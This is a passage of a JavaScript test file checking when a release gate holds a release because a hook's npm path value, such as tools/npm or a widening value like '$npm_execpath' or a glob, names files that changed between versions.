    test("a value file added on the new side holds", () => expect(held(hookOf("tools/npm"), {}, { "tools/npm": "1" })).toBe(true));
    test("a value file removed on the new side holds", () => expect(held(hookOf("tools/npm"), { "tools/npm": "1" }, {})).toBe(true));
    test("a value file the same on both sides is quiet on a bump-only release", () => expect(held(hookOf("tools/npm"), { "tools/npm": "1" }, { "tools/npm": "1" })).toBe(false));
    test("the root manifest named as the value does not hold every bump", () => expect(held(hookOf("package.json"), {}, {})).toBe(false));
    test("the root manifest named with ./ does not hold every bump", () => expect(held(hookOf("./package.json"), {}, {})).toBe(false));
    // Known false hold: a widening value names every file, so a README-only change holds (the base released it).
    test("a widening value holds a change of any file (known false hold)", () => expect(held(hookOf("$npm_execpath"), { "README.md": "a" }, { "README.md": "b" })).toBe(true));
    for (const value of ["$npm_execpath", "../x", "'tools/*'", "'tools/[a]'", "'tools/?'"]) {
      test(`a widening value ${value}: a bump-only release is quiet`, () => expect(held(hookOf(value), { "README.md": "a" }, { "README.md": "a" })).toBe(false));
      test(`a widening value ${value}: a changed nested manifest holds`, () => expect(held(hookOf(value), { "sub/package.json": "{}" }, { "sub/package.json": '{"a":1}' })).toBe(true));
    }
    test("a glob with [ names every file", () => expect(held(hookOf("'tools/[a]'"), { "README.md": "a" }, { "README.md": "b" })).toBe(true));
    test("a ~ value names every file", () => expect(held(hookOf("~/npm"), { "README.md": "a" }, { "README.md": "b" })).toBe(true));
    // The file is named on a line with a backslash: only the backslash reading reads it (the merge of the second reading's npmFiles).
    test("a value read only by the backslash reading holds on a change", () => expect(held(hookOf("tools/npm", "; echo a\\\\b"), { "tools/npm": "1" }, { "tools/npm": "2" })).toBe(true));
    test("a value on an escaped runner word, read only by the backslash reading, holds on a change", () => expect(held("\\npm-run-all --npm-path tools/npm build", { "tools/npm": "1" }, { "tools/npm": "2" })).toBe(true));
    // The new reading takes `tools\\/npm` as tools/npm; the old one keeps the backslash and so names every file: the merge keeps what the old one named.
    test("a value with a backslash, named by the old reading as every file, holds a change of another file", () => expect(held(hookOf("tools\\/npm"), { "tools/npm": "1", "lib/o": "1" }, { "tools/npm": "1", "lib/o": "2" })).toBe(true));
    test("a value read only by the main reading holds on a change", () => expect(held(hookOf("tools/npm"), { "tools/npm": "1" }, { "tools/npm": "2" })).toBe(true));
  });
});
